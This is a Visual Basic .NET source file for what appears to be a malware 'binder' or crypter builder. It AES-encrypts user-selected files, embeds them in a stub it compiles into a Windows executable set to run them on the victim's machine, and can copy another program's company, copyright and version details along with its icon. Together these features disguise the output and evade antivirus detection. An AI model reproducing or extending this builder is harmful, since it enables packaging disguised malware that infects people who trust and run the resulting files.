Imports System.CodeDom.Compiler
Imports System.Security.Cryptography
Imports System.IO
Imports System.Text

Public Class Binderdom
    Public Shared Sub Compiler(ByVal Path As String, ByVal Res As String)

        Try
            Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", "v4.0")
            Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
            Dim Parameters As New CompilerParameters
            Dim OP As String = " /target:winexe /platform:anycpu /nowarn"



            With Parameters
                .GenerateExecutable = True
                .OutputAssembly = Path
                .CompilerOptions = OP
                .IncludeDebugInformation = False
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .ReferencedAssemblies.Add("system.dll")
                .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

                Dim Source = My.Resources.code

                Source = Source.Replace("#ParentRes", Binder.Resources_Parent)
                Source = Source.Replace("%path%", Binder.ComboBox2.Text)
                Source = Source.Replace("%mut%", Binder.keyy)


                If Binder.CheckBox1.Checked Then
                    Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(Binder.assmb)


                    Source = Replace(Source, "%Title%", info.FileDescription)
                    Source = Replace(Source, "%Des%", info.Comments)
                    Source = Replace(Source, "%Company%", info.CompanyName)
                    Source = Replace(Source, "%Product%", info.ProductName)
                    Source = Replace(Source, "%Copyright%", info.LegalCopyright)
                    Source = Replace(Source, "%Trademark%", info.LegalTrademarks)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", info.FileMajorPart.ToString())
                    Source = Source.Replace("%v2%", info.FileMinorPart.ToString())
                    Source = Source.Replace("%v3%", info.FileBuildPart.ToString())
                    Source = Source.Replace("%v4%", info.FilePrivatePart.ToString())
                Else
                    Source = Replace(Source, "%Title%", Nothing)
                    Source = Replace(Source, "%Des%", Nothing)
                    Source = Replace(Source, "%Company%", Nothing)
                    Source = Replace(Source, "%Product%", Nothing)
                    Source = Replace(Source, "%Copyright%", Nothing)
                    Source = Replace(Source, "%Trademark%", Nothing)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", 1)
                    Source = Source.Replace("%v2%", 0)
                    Source = Source.Replace("%v3%", 0)
                    Source = Source.Replace("%v4%", 0)
                End If

                Dim alist As String = Nothing
                Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                    For Each item As ListViewItem In Binder.L1.Items

                        Dim ran As String = Nothing

                        Dim pathhh As String = item.SubItems(0).Text
                        Dim runn As String = item.SubItems(2).Text
                        Dim runnonce As String = item.SubItems(3).Text



                        ran = IO.Path.GetFileName(pathhh)



                        R.AddResource(ran, AES_Encryptor(IO.File.ReadAllBytes(pathhh)))
                        alist &= """" & ran & sp & runn & sp & runnonce & """" & ","
                    Next


                    R.Generate()
                    Source = Source.Replace("""%list%""", alist.Trim.TrimEnd(","))
                End Using

                .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Binder.Resources_Parent + ".Resources")


                Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Source)
                If Results.Errors.Count > 0 Then
                    For Each E In Results.Errors
                        MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                    Next

                End If

            End With



            Dim file3 As String = IO.Path.GetTempPath & "\" + Res + ".Resources"
            If IO.File.Exists(file3) Then
                IO.File.Delete(file3)
            End If

            If Binder.CheckBox2.Checked = True Then
                System.Threading.Thread.Sleep("1500")
                IconInjector.InjectIcon(Binder.outs, Binder.iconpathhh)
            End If
            GC.Collect()
            MessageBox.Show(Path, "DONE!")
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Public Shared Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Dim ciphertext As String = ""
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(Binder.keyy))
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
    Public Shared sp As String = "||'^'||"
End Class
